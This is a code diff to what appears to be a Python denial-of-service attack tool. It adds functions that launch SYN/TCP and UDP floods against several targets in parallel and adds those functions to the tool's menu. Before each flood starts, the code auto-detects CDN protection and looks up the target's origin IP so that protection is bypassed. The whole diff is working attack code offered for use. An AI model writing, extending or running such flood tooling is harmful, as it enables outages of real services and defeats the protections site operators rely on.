@@ -2119,6 +2119,70 @@ async def _run_python_flood(target: str, duration: int, threads: int, method_nam
     vec["status"] = "done"
     return {"total_requests": sent + failed, "completed": sent, "failed": failed, "timeout": 0, "elapsed": duration}
 
+async def run_syn_flood_multi(targets: List[str], cfg: dict):
+    """Multi-target: SYN/TCP Flood against multiple targets in parallel."""
+    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
+    threads = int(get_input(" Workers per target (default 200): ") or "200")
+    
+    print(f"\n {c('c','[*]')} Multi-Target SYN/TCP Flood")
+    print(f" {c('c','[*]')} {len(targets)} targets | {duration}s | {threads} workers/target")
+    _rich_sep()
+    
+    async def attack_one(target):
+        # Auto-detect CDN and find origin
+        from core.recon.target_detector import auto_detect_target
+        profile = await auto_detect_target(target, verbose=False)
+        origin_ip = None
+        if profile and profile.has_cdn:
+            try:
+                from core.recon.origin.origin_finder import find_origin_ip
+                origin_result = await find_origin_ip(target, timeout=10)
+                if origin_result and origin_result.get("origin_ip"):
+                    origin_ip = origin_result["origin_ip"]
+                    target = origin_ip
+            except:
+                pass
+        
+        from core.attack.engines.layer4_v5 import TcpConnectionFlood
+        engine = TcpConnectionFlood()
+        r = await engine.attack(target, duration=duration, threads=threads)
+        return {"sent": r.get("sent", 0), "completed": r.get("sent", 0), "failed": r.get("failed", 0)}
+    
+    results = await run_multi_target(attack_one, targets, "SYN Flood", duration)
+    print_multi_summary(targets, results, duration)
+
+async def run_udp_flood_multi(targets: List[str], cfg: dict):
+    """Multi-target: UDP Flood against multiple targets in parallel."""
+    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
+    threads = int(get_input(" Workers per target (default 200): ") or "200")
+    
+    print(f"\n {c('c','[*]')} Multi-Target UDP Flood")
+    print(f" {c('c','[*]')} {len(targets)} targets | {duration}s | {threads} workers/target")
+    _rich_sep()
+    
+    async def attack_one(target):
+        # Auto-detect CDN and find origin
+        from core.recon.target_detector import auto_detect_target
+        profile = await auto_detect_target(target, verbose=False)
+        origin_ip = None
+        if profile and profile.has_cdn:
+            try:
+                from core.recon.origin.origin_finder import find_origin_ip
+                origin_result = await find_origin_ip(target, timeout=10)
+                if origin_result and origin_result.get("origin_ip"):
+                    origin_ip = origin_result["origin_ip"]
+                    target = origin_ip
+            except:
+                pass
+        
+        from core.attack.engines.layer4_v5 import UdpFloodV5
+        engine = UdpFloodV5()
+        r = await engine.attack(target, duration=duration, threads=threads)
+        return {"sent": r.get("sent", 0), "completed": r.get("sent", 0), "failed": 0}
+    
+    results = await run_multi_target(attack_one, targets, "UDP Flood", duration)
+    print_multi_summary(targets, results, duration)
+
 async def run_syn_flood(target: str, cfg: dict):
     """SYN / TCP Connection Flood with LIVE DASHBOARD + Auto CDN Bypass"""
     duration = int(get_input(" Duration (seconds, default 30): ") or "30")
@@ -3355,10 +3419,10 @@ async def cmd_menu(cfg):
             if await _module_dispatch(run_proxy_flood, None, cfg):
                 get_input(" Press Enter to continue...")
         elif choice == "6":
-            if await _module_dispatch(run_syn_flood, None, cfg, label="Target IP/Host"):
+            if await _module_dispatch(run_syn_flood, run_syn_flood_multi, cfg, label="Target IP/Host"):
                 get_input(" Press Enter to continue...")
         elif choice == "7":
-            if await _module_dispatch(run_udp_flood, None, cfg, label="Target IP/Host"):
+            if await _module_dispatch(run_udp_flood, run_udp_flood_multi, cfg, label="Target IP/Host"):
                 get_input(" Press Enter to continue...")
         elif choice == "8":
             if await _module_dispatch(run_mixed_attack, run_mixed_attack_multi, cfg):
